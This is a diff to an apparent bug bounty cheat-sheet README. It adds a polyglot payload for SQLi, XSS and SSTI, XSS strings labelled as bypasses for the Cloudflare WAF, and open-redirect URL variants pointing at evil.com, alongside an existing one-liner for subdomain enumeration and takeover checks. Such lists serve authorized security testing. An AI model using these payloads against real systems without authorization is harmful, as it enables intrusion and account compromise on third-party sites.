@@ -1,4 +1,4 @@
-# BugBounty Commands
+# BugBounty Resources
 
 ## Introduction
 
@@ -27,9 +27,29 @@ If you think any important commands were not listed in this repository, feel fre
   
  ## Finding subdomains and check for takeovers 
       subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/fingerprints.json -v 3 >> takeover ;
-
+    
+  ## Testing SQLi + XSS + SSTI with the same payload use
+  	"><svg/onload=prompt(5);>{{7*7}}
+  
+  ##  XSS Cloudflare WAF bypass: 
+  	<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+	<select><noembed></select><script x=’a@b’a>y=’a@b’//a@b%0a\u0061lert(1)</script x>
+	<a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’>
+	
+  ## Valid URLs (Open Redirect Vulnerability)
+	http(s)://evil.com
+	http(s):\\evil.com
+	//evil.com
+	///evil.com
+	/\/evil.com
+	\/evil.com
+	\\evil.com
+	\/\evil.com
+	/	/evil.com (That's a Tab Key / ASCII 0x09)
+	\	\evil.com (That's a Tab Key / ASCII 0x09)
 
 #### Refrences:
   - https://github.com/dwisiswant0/awesome-oneliner-bugbounty
   - https://github.com/XalfiE/Bug-Bounty-Oneliners
+  - https://bbinfosec.medium.com/collection-of-bug-bounty-tip-will-be-updated-daily-605911cfa248
   
